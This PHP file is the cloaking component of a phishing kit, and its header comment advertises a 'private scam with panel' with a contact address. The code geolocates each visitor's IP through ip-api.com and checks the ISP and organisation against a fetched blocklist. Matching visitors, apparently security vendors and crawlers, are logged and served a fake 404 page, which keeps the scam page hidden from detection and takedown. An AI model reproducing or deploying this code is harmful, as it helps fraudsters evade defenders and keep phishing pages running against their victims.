<?php
/*
yoυ wan'т a prιvaтe ѕcaм wιтн panel and oтнer opтιonѕ? => ix@oυтlooĸ.fr
*/ 
$setting = parse_ini_file('conf.pak'); 
$getphp = $setting['setup_php']; 
if($getphp == CHIFRA12PHP) 
{



function get_ip_address() {
    $ip_keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (validate_ip($ip)) {
                    return $ip;
                }
            }
        }
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
}

function validate_ip($ip){
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return true;
}


function _ndok_redirect_check($redirect_url){
	$redirect = false;
	$ip = get_ip_address(); 
	$ipzs =  '176.31.84.249';
///////////////////////////////////////////////////////////////////////////
// create curl resource
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/$ip");
curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36");
curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_REFERER, 'http://ip-api.com');
$output = curl_exec($ch);
$data = json_decode($output,true);
curl_close($ch);
///////////////////////////////////////////////////////////////////////////
	
	if($data && $data['status'] == 'success') {
		// set variables
		$isp = strtolower($data['isp']);
		$org = strtolower($data['org']);
		
// Fixed
$ali['base_url'] = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https" : "http");
$ali['base_url'] .= "://".$_SERVER['HTTP_HOST'];
$ali['base_url'] .= str_replace(basename($_SERVER['SCRIPT_NAME']),"",$_SERVER['SCRIPT_NAME']);
// url
$schema = isset($_SERVER["HTTPS"]) ? "https:" : "http:";
$url    = $ali['base_url'].'assets/includes/khalaf.engine';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$url");
curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36");
curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec($ch);
$lists = explode("\n", $content);
$lists = array_map('strtolower', $lists);
curl_close($ch);
		
		
		// get black list
		foreach($lists as $list){
			if(strpos($isp, $list) !== false){
				$redirect = true;
			}
			if(strpos($org, $list) !== false){
				$redirect = true;
			}
		}
		
		if( $redirect ){
$myfile = fopen("assets/logs/external.txt", "a++") or die("Unable to open file!");
fwrite($myfile, $ip. PHP_EOL);
fclose($myfile);	
header("HTTP/1.0 404 Not Found");
echo "<h1>404 Not Found</h1>";
echo "The page that you have requested could not be found.";
exit();
		}
	}
}
_ndok_redirect_check('index.php?node=1');
}
else 
{ echo ""; } 
?>                              